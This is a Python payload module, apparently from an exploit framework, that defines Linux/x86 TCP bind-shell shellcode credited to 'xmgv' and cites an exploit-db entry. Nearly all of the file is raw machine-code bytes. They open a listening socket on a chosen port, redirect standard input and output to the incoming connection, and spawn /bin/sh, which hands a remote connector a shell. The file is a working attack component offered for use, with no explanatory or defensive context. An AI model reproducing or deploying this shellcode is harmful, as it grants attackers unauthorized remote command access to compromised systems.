from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "xmgv"
    Shellcode.info["name"] = "Linux/x86 - tcp_bind shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/36398/",
        "https://xmgv.wordpress.com/2015/02/19/28/",
    ]

    def __init__(self, **kwargs):
        Shellcode.info["size"] = 94 + Shellcode().getsize(kwargs["lport"]) 
        Shellcode.info["payload"] = [
            r"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53"
            r"\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
            r"\x66\x43\x52\x66\x68"
            + kwargs["lport"] +
            r"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89"
            r"\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89"
            r"\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1"
            r"\xcd\x80\x93\x31\xc9\xb1\x02"
            r"\xb0\x3f\xcd\x80\x49\x79\xf9\x92"
            r"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            r"\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"

        ]




